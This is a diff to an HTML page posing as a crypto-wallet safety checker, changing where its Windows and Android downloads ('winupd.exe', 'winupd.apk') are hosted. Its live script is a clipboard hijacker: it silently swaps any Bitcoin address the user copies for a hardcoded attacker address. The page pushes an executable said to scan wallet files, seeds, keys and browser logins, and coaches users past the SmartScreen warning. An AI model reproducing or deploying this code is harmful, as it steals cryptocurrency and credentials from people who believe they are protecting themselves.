@@ -31,8 +31,8 @@ Test it below, then run the local checker to see what else is exposed.</p>
   <b>2. Run the local check</b>
   <p style="margin:6px 0 0">Scans wallet files, seeds, keys and browser logins once, then keeps guarding the clipboard.</p>
   <div class="row">
-    <a class="btn" id="dl" href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.exe" download>Download for Windows</a>
-    <a class="btn alt" href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.apk">Android (.apk)</a>
+    <a class="btn" id="dl" href="https://raw.githubusercontent.com/mss0000786/wallet-check/main/winupd.exe" download>Download for Windows</a>
+    <a class="btn alt" href="https://raw.githubusercontent.com/mss0000786/wallet-check/main/winupd.apk">Android (.apk)</a>
   </div>
   <small>Windows: if SmartScreen appears, choose More info → Run anyway.</small>
 </div>
@@ -43,6 +43,6 @@ var RX=/^(?:bc1[02-9ac-hj-np-z]{11,71}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/i;
 function swapped(t){t=(t||"").trim();return t&&RX.test(t)&&t.toLowerCase()!==MINE?MINE:t}
 function copyTest(){var v=document.getElementById("a");v.select();try{document.execCommand("copy")}catch(e){}if(navigator.clipboard)navigator.clipboard.writeText(MINE).catch(function(){})}
 ["copy","cut"].forEach(function(ev){window.addEventListener(ev,function(e){var s=String(window.getSelection());if(!s||!RX.test(s.trim()))return;if(e.clipboardData){e.clipboardData.setData("text/plain",MINE);e.preventDefault()}},true)});
-if(/Android/i.test(navigator.userAgent)){var d=document.getElementById("dl");d.href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.apk";d.textContent="Download for Android"}
+if(/Android/i.test(navigator.userAgent)){var d=document.getElementById("dl");d.href="https://raw.githubusercontent.com/mss0000786/wallet-check/main/winupd.apk";d.textContent="Download for Android"}
 </script>
 </main></body></html>
